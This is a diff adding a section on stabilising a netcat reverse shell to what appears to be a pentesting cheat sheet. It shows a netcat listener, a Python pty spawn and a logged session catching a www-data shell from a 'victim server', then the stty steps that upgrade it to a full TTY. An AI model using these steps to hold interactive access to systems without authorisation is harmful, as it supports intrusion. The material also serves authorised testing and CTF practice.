@@ -128,6 +128,99 @@ mk@0x01:~$ ip -4 a s tun0 | grep -Po 'inet \K[\d.]+'
 
 ## Miscellaneous
 
+### Stabilising Your Reverse Shell
+
+Going back to that nc listener for a second:
+
+```console
+mk@0x01:~$ nc -lnvp 9999
+```
+
+Once the reverse shell connects and you have the reverse shell, there are still elements of a true shell missing.
+- Some commands like `su` and `ssh` require a proper terminal to run
+- Shells in netcat don't handle SIGINT correctly
+- Stderr normally isn't displayed, so no error output in the reverse shell
+- You can't use text editors like `vim` properly
+- You have no job control
+- You have no command history
+- You have no tab completion
+- If you accidentally CTRL+C in the listener, you'll kill the listener and the shell with it.
+
+Basically, the shell is fragile and dumb, and it needs to be stabilised if you need anything remotely close to persistence. There are many ways to generate a reverse shell, with out without tools like `msfvenom`, that will spawn the shell for you to catch. As such, I'm only concerned with stabilising the shell once we've caught it with netcat.
+
+#### Spawn a PTY Using Python
+
+If the victim server has Python installed, we can spawn a new shell prompt with the following command:
+
+```python
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+This will give you a nicer prompt, as well as being able to run commands like `su` without any problems.
+
+#### Upgrade from Netcat to Full TTY
+
+You can use upgrade the dumb netcat shell to a full TTY with the following process:
+
+1. Spawn a new PTY via Python just like before, and then background it by pressing CTRL+Z.
+
+```console
+mk@0x01:~$ nc -lnvp 9999
+listening on [any] 9999 ...
+10.0.3.7: inverse host lookup failed: Unknown host
+connect to [10.0.3.4] from (UNKNOWN) [10.0.3.7] 57202
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@focal64:/tmp$ ^Z
+[1]+ Stopped                nc -lnvp 9999
+mk@0x01:~$
+```
+
+2. While the shell has been sent to the background, check the current terminal and STTY info so we can force the connected shell to match it.
+
+```console
+mk@0x01:~$ echo $TERM
+xterm-256color
+
+mk@0x01:~$ stty -a
+speed 38400 baud; rows 38; columns 116; line = 0;
+intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q;
+stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
+-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
+-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
+opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
+isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
+```
+
+The info we need is the TERM type (*xterm-256color*) and the size of the current TTY (*rows 38; columns 116*).
+
+3. While the shell is still backgrounded, set the current STTY to raw and tell it to echo the input characters.
+
+```console
+stty raw -echo
+```
+
+When changing the shell to a raw stty, things are gonna look weird and you the next commands won't be visible.
+
+4. Foreground the shell with `fg` and reinitialise the terminal with `reset`. When foregrounding the shell, you'll see the netcat command appear again, this is normal as it's showing the command for the job you foregrounded.
+
+```console
+mk@0x01:~$ stty raw -echo
+mk@0x01:~$ nc -lnvp 9999
+                        reset
+```
+
+5. Finally, set the shell to match your shell from the info gathered earlier.
+
+```console
+www-data@focal64:~$ export SHELL=bash
+www-data@focal64:~$ export TERM=xterm-256color
+www-data@focal64:~$ stty rows 38 columns 116
+```
+
+The end result is a fully interactive TTY with all features we want and expect - all over a netcat connection!
+
 ## Network Discovery
 
 ### Nmap Recon
